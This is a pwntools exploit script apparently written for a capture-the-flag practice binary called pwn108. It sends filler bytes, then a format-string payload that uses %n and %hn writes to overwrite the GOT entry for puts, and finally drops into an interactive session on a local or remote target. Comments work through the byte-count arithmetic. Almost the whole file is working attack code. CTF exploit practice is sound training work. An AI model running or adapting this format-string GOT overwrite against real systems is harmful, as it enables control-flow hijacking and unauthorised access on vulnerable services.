import sys
from struct import *

from pwn import *

context(os="linux", arch="amd64")

elf = ELF("./pwn108-1644300489260.pwn108")
context.binary = binary = elf


def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([binary.path] + argv, *a, **kw)


io = start()


junk_payload = b""
junk_payload += b"A" * 18

io.send(junk_payload)


got_puts_address = binary.got.puts


# input location = %10
#
# Number of bytes to write = Desire value - number of byte written so far
# 1st write 0x40 = 64 - 0 =64
# 2nd write 0x123b = 4667 - 64 = 4603

payload = b""
payload += b"%64X%13$n"  # 1nd
payload += b"%4603X%14$hnAAA"  # 2nd
# 1nd + 2nd must equale full 8 byte value like 8, 16, 32 char if not padding it with char
payload += p64(got_puts_address + 2)
payload += p64(got_puts_address)


io.send(payload)


io.interactive()
